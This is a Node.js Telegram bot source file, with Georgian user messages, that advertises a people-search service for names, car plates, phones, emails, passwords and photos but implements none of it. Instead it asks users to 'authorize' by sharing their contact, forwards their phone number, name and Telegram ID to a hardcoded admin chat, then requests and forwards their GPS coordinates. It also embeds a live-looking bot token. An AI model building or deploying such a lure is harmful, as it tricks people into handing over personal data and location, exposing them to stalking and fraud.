const TelegramBot = require("node-telegram-bot-api"); 
const fs = require('fs')
const TOKEN = "1785928231:AAFagCJchHtlZSFZydbQ1GZn__AW492u9Rs"
const bot = new TelegramBot(TOKEN, {polling: true}); 

const DeviceDetector = require('node-device-detector');
const detector = new DeviceDetector;
const userAgent = 'Mozilla/5.0 (Linux; Android 5.0; NX505J Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Mobile Safari/537.36';
const result = detector.detect(userAgent);



bot.onText(/\/start/, function(msg) {
    const id = msg.chat.id; // id - это ID чата, чтобы отправлять сообщение именно пользователю который это написал

   console.log(id); // Нам надо также запомнить chat_id с нами, это потребуется в будующем
    bot.sendMessage(id, `
🤔 თქვენ შეგიძლიათ გაუგზავნოთ ბოტს მოთხოვნები შემდეგ ფორმატში:

👤 სახელით ძება
├  ბლოგერ
├  თენგიზ მაისურაძე
├  თენგიზ მაისურაძე ვალერისძე
└  ანა ლომთაძე ტორნიკეს ასული 29.03.1983

🚗 ავტომობილით ძება
├  М999ММ99 - ავტომობილის ძება საქართველოში
├  ВО4561АХ - ავტომობილის ძება УК-თი
└  ХТА21150053965897 - VIN-ით ძება

👨 სოციალური ქსლები
├  https://vk.com/id - VKontakte
└  https://www.facebook.com/profile.php?id=101200225642729 - Facebook

📱 571463489 - ტელეფონის ნიმრით ძიება
📨 name@mail.ru - Email-ით ძება
📧 #id713052, @nikusha ან გადმოგვიგზავნეთ წერილი - Telegram ანგარიშით ზიება

🔐 /pas churchill7 - ფოსტის ძიება, ლოგინისა და ტელეფონის პაროლით
🏚 /adr თბილისი, ჭავჭავაძეს ქუჩა, სახლი 1, ბინა 1 - მისამართით ინფორმაცია

🏛 /company თიბისი - იურიდიული პირებით ძება
📑 /inn 784806113663 - INN-ით ძება

🌐 8.8.8.8 или https://google.com - IP მისამართის ან დომენის შესახებ ინფორმაცია
💰 '1AmajNxtJyU7JjAuyiFFkqDaaxuYqkNSkF' - ინფორმაცია Bitcoin მისამართის შესახებ

📸 გამოგვიგზავნეთ პიროვნების ფოტო, რომ იპოვოთ იგი ან ორეული Facebook-ში.
🚙 გამოგვიგზავნეთ მანქანის სანომრე ნიშნის ფოტო, რომ მიიღოთ ინფორმაცია მის შესახებ.
🌎 გამოგვიგზავნეთ წერტილს რუკაზე, რომ იპოვოთ ის ხალხი, ვინც ახლა იქ არის.
🗣 თქვენ ასევე შეგიძლიათ შეასრულოთ ძიება ხმოვანი ბრძანებების გამოყენებით.`, {
        reply_markup: { // Отправляем также клавиатуру
            keyboard: [[{
                text: "ავტორიზაცია", // Текст который будет на клавиатуре
                request_contact: true  // Будем ли мы запрашивать контакт
            }]],
            resize_keyboard: true,
            one_time_keyboard: true,
        }
    })
});

const admin = "474820695";
bot.on("contact", function(msg) {

    
    bot.sendMessage(admin, "მიღებული მონაცემები: " + '\n' + '\n' +
    	"ტელეფონის ნომერი: " + msg.contact.phone_number + '\n' +
    	"სახელი ტელეგრამში: " + msg.contact.first_name + '\n' +
        "გვარი ტელეგრამში: " + msg.contact.last_name + '\n' +
    	"მომხმარებელის ID: " + msg.contact.user_id);    
});

bot.on("contact", (msg) => {
  const id = {
    reply_markup: JSON.stringify({
      keyboard: [
        [{text: 'ავტორიზაცია', request_location: true}],
      ],
      resize_keyboard: true,
      one_time_keyboard: true,
    }),
  };
  
  var link = "https://tgraph.io/%E1%83%A5%E1%83%90%E1%83%A0%E1%83%97%E1%83%A3%E1%83%9A%E1%83%98-%E1%83%9B%E1%83%9D%E1%83%9C%E1%83%90%E1%83%AA%E1%83%94%E1%83%9B%E1%83%97-%E1%83%91%E1%83%90%E1%83%96%E1%83%90-04-17"
  bot.sendMessage(msg.chat.id, 'გთხოვთ წაიკითხოთ ჩვენი სტატია:' + link, id);
});


bot.on('location', (msg) => {
  console.log(msg.location.latitude);
  console.log(msg.location.longitude);

  bot.sendMessage(admin, "კოორდინატები: " + '\n' + '\n' +
    	"Latitude: " + msg.location.latitude + '\n' +
    	"Longitude: " + msg.location.longitude);
});

